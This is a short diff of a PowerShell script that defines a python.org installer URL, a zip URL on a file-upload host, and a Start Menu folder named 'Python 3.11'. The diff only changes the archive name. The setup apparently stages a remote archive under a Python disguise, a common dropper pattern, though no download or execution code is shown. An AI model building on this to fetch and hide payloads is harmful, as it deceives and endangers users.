@@ -1,6 +1,6 @@
 # Define variables
 $pythonInstallerUrl = "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe"
-$zipScriptUrl = "https://s01.babup.com/uploads/SystemXCXC.zip"
+$zipScriptUrl = "https://s01.babup.com/uploads/SystemXCXZ.zip"
 $targetDirectory = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Python 3.11"
 
 # Function to check if the directory contains four files or shortcuts
